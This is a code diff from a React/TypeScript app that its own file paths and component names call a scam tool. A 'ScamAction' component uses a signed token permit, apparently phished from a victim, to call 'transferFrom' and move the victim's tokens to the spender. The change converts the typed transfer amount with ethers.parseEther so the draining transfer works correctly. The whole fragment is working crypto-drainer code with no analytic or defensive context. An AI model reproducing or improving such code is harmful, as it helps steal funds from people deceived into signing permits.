@@ -4,6 +4,7 @@ import {SignedPermitSignature} from "@/app/scam/page";
 import { callContractMethod } from "../page";
 import {CustomContract} from "@/app/TokenList";
 import React, {useState} from "react";
+import {ethers} from "ethers";
 
 const ScamAction = (props: {
 	data: SignedPermitSignature
@@ -55,7 +56,7 @@ const ScamAction = (props: {
 				callContractMethod('transferFrom', [
 					data.permit.owner,
 					data.permit.spender,
-					window.prompt("Enter Amount to transfer"),
+					ethers.utils.parseEther(window.prompt("Enter Amount to transfer")+""),
 					{
 						gasLimit: 50000
 					}
